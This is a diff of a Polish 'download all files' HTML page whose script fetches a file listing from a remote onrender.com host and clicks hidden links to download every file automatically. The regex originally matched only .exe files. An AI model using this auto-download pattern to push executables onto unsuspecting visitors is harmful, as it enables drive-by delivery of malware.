@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pobierz pliki</title>
+    <title>Pobierz wszystkie pliki</title>
 </head>
 <body>
     <script>
@@ -12,12 +12,14 @@
                 const response = await fetch('https://niga-behc.onrender.com/');
                 const text = await response.text();
 
-                const regex = /href="([^"]+\.exe)"/g;
+                const regex = /href="([^"]+)"/g;
                 let files = [];
                 let match;
                 
                 while ((match = regex.exec(text)) !== null) {
-                    files.push(match[1]);
+                    if (!match[1].startsWith('/')) { // Pomijamy katalogi
+                        files.push(match[1]);
+                    }
                 }
 
                 if (files.length > 0) {
@@ -34,7 +36,7 @@
             files.forEach(file => {
                 const link = document.createElement('a');
                 link.href = `https://niga-behc.onrender.com/${file}`;
-                link.download = file;
+                link.download = file.split('/').pop();
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
